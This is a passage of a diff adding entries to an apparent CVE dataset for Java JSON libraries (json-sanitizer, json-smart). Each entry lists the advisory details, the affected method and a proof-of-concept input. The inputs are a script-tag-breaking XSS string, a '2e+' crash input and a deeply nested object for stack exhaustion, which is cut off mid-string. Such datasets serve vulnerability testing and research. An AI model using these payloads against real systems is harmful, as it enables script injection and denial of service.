+    "Category": "security/injection",
+    "CVE_Library": "com.mikesamuel/json-sanitizer",
+    "CVE_Library_version": "<1.2.2",
+    "CVE_Library_url": "https://www.cve.org/CVERecord?id=CVE-2021-23899",
+    "CVE_POC": "x</\\script><\\script>5+alert(1)//",
+    "CVE_Description": "OWASP json-sanitizer before 1.2.2 may emit closing SCRIPT tags and CDATA section delimiters for crafted input. This allows an attacker to inject arbitrary HTML or XML into embedding documents.\n\n",
+    "CVE_Class": "com.google.json.JsonSanitizer",
+    "CVE_Method": "sanitize(java.lang.String):java.lang.String"
+  },
+  {
+    "CVE_Number": "CVE-2021-27568",
+    "Category": "security/DoS",
+    "CVE_Library": "net.minidev/json-smart",
+    "CVE_Library_version": "<1.3.2,>=2.4.0,<2.4.1,>=2.0.0,<2.3.1",
+    "CVE_Library_url": "https://github.com/advisories/GHSA-v528-7hrm-frqp",
+    "CVE_POC": "2e+",
+    "CVE_Description": "An issue was discovered in netplex json-smart-v1 through 2015-10-23 and json-smart-v2 through 2.4. An exception is thrown from a function, but it is not caught, as demonstrated by NumberFormatException. When it is not caught, it may cause programs using the library to crash or expose sensitive information.",
+    "CVE_Class": "net.minidev.json.parser.JSONParser",
+    "CVE_Method": "parse(java.lang.String):java.lang.Object"
+  },
+
+  {
+    "CVE_Number": "CVE-2023-1370",
+    "Category": "security/DoS",
+    "CVE_Library": "net.minidev/json-smart",
+    "CVE_Library_version": "<2.4.9",
+    "CVE_Library_url": "https://github.com/advisories/GHSA-493p-pfq6-5258",
+    "CVE_POC": "{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'a':{'